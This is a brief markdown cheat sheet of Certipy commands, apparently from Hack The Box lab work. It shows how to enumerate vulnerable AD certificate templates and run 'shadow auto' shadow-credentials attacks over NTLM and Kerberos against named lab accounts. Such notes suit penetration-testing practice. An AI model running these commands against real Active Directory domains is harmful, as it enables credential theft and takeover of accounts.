# Certipy

**Find Vulnerbility**

```zsh
certipy find -u cert_admin -p "Abc123456@" -dc-ip 10.10.11.72 -vulnerable
```

**Shadow Creds**

```zsh
# NTLM
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'

# KERBEROS
certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account 'stephen.m'
```
